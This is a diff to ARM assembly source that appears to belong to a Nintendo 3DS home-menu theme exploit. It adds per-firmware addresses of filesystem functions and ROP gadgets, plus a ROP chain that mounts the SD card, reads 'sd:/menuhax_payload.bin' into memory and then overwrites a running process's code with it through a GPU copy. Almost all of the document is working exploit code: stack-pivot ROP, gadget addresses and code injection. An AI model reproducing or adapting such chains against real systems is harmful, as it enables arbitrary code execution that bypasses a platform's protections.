@@ -33,6 +33,14 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define APT_SendParameter 0x00214ab0 //inr0=dst appid inr1=signaltype inr2=parambuf* inr3=parambufsize insp0=handle
 
 #define NSS_RebootSystem 0x00136a0c
+
+#define FS_MountSdmc 0x0011cacc //inr0=archivename*
+
+#define IFile_Open 0x00218c04 //inr0=ctx inr1=utf16* path inr2=openflags
+#define IFile_Close 0x0021dcbc //inr0=ctx
+#define IFile_Read 0x00218b1c //inr0=ctx inr1=u32* total transferred data inr2=buf inr3=size
+
+#define ROP_COND_THROWFATALERR 0x001028f8//When r0 is not negative, this executes "pop {r3, r4, r5, pc}". Otherwise it executes: "pop {r3, r4, r5, lr}" "b <throwfatalerr func>"
 #else
 #define ROP_LOADR4_FROMOBJR0 0x10b64c
 #define ROP_POPPC 0x102028
@@ -46,6 +54,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define GSPGPU_Shutdown 0x0011da58
 
 #define NSS_RebootSystem 0x00139874
+
+#define ROP_COND_THROWFATALERR 0x001028dc
 #endif
 
 #if SYSVER == 93
@@ -80,6 +90,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define ROP_STR_R1TOR0 0x00103f40
 #define ROP_LDR_R0FROMR0 0x0010efe8
 #define ROP_ADDR0_TO_R1 0x0012e708
+
+#define FS_MountSdmc 0x0011c9b4
 #endif
 
 #if SYSVER == 92
@@ -104,6 +116,10 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define GSPGPU_FlushDataCache 0x0014d55c
 
 #define APT_SendParameter 0x00205ba0
+
+#define IFile_Open 0x00209f20
+#define IFile_Close 0x0020c148
+#define IFile_Read 0x00209e0c
 #endif
 
 #if SYSVER <= 91 //v9.0-v9.1j
@@ -135,6 +151,10 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define ORIGINALOBJPTR_LOADADR (0x002f1820+8)
 
 #define APT_SendParameter 0x00205c08
+
+#define IFile_Open 0x00209f88
+#define IFile_Close 0x0020c1b0
+#define IFile_Read 0x00209e74
 #endif
 
 #if SYSVER == 94
@@ -176,6 +196,12 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define NSS_PROCLOADTEXT_LINEARMEMADR 0x36500000
 #else
 #define NSS_PROCLOADTEXT_LINEARMEMADR ((0x3d900000-0x400000)+0x21b000)//In SKATER, overwrite the code which gets called for assert/svcBreak when allocating the main heap fails.
+#endif
+
+#ifndef LOADSDPAYLOAD
+#define CODEBINPAYLOAD_SIZE (codedataend-codedatastart)
+#else
+#define CODEBINPAYLOAD_SIZE 0x10000
 #endif
 
 .macro ROP_SETLR lr
@@ -298,6 +324,14 @@ PREPARE_RET2MENUCODE
 ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4R5R6PC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
 .endm
 
+.macro COND_THROWFATALERR
+.word ROP_COND_THROWFATALERR
+
+.word 0 @ r3
+.word 0 @ r4
+.word 0 @ r5
+.endm
+
 _start:
 
 themeheader:
@@ -371,6 +405,18 @@ gamecard_titleinfo:
 .word 0, 0 @ programID
 .word 2 @ mediatype
 .word 0 @ reserved
+
+#ifdef LOADSDPAYLOAD
+sd_archivename:
+.string "sd:"
+.align 2
+
+IFile_ctx:
+.space 20
+
+sdfile_path:
+.string16 "sd:/menuhax_payload.bin"
+#endif
 
 tmp_scratchdata:
 .space 0x400
@@ -493,7 +539,27 @@ bootgamecard_ropfinish:
 CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x3, 0x3, 0, 0
 #endif
 
-CALLFUNC_NOSP GSPGPU_FlushDataCache, (HEAPBUF + (codedatastart - _start)), (codedataend-codedatastart), 0, 0
+#ifdef LOADSDPAYLOAD//When enabled, load the file from SD to codebinpayload_start.
+CALLFUNC_NOSP FS_MountSdmc, (HEAPBUF + (sd_archivename - _start)), 0, 0, 0
+COND_THROWFATALERR
+
+CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_path - _start)), 1, 0
+COND_THROWFATALERR
+
+CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (codebinpayload_start - _start)), (CODEBINPAYLOAD_SIZE - (codebinpayload_start - codedatastart))
+COND_THROWFATALERR
+
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word (HEAPBUF + (IFile_ctx - _start))
+
+.word ROP_LDR_R0FROMR0
+
+.word IFile_Close
+#endif
+
+CALLFUNC_NOSP GSPGPU_FlushDataCache, (HEAPBUF + (codedatastart - _start)), CODEBINPAYLOAD_SIZE, 0, 0
 
 ROP_SETLR POP_R2R6PC
 
@@ -550,7 +616,7 @@ CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
 #endif
 
 //Overwrite the browser .text with the below code.
-CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), NSS_PROCLOADTEXT_LINEARMEMADR, (codedataend-codedatastart)
+CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), NSS_PROCLOADTEXT_LINEARMEMADR, CODEBINPAYLOAD_SIZE
 
 /*#if NEW3DS==1 //Free the memory which was allocated above on new3ds.
 CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x1, 0x0, 0, 0
@@ -662,7 +728,6 @@ mov r1, #2
 svc 0x0a @ Sleep 10 seconds, so that hopefully the payload doesn't interfere with sysmodule loading.*/
 #endif
 
-#ifdef CODEBINPAYLOAD
 ldr r0, =0x10003 @ operation
 mov r4, #3 @ permissions
 
@@ -681,6 +746,7 @@ str r1, [r4, #0x5c] @ NS appID (use the homemenu appID since the browser appID w
 mov r0, r4
 adr r1, codecrash
 mov lr, r1
+#ifdef PAYLOADENABLED
 b codebinpayload_start
 #else
 b codecrash
@@ -694,8 +760,9 @@ code_end:
 b code_end
 .pool
 
-#ifdef CODEBINPAYLOAD
+.align 4
 codebinpayload_start:
+#ifdef CODEBINPAYLOAD
 .incbin CODEBINPAYLOAD
 #endif
 
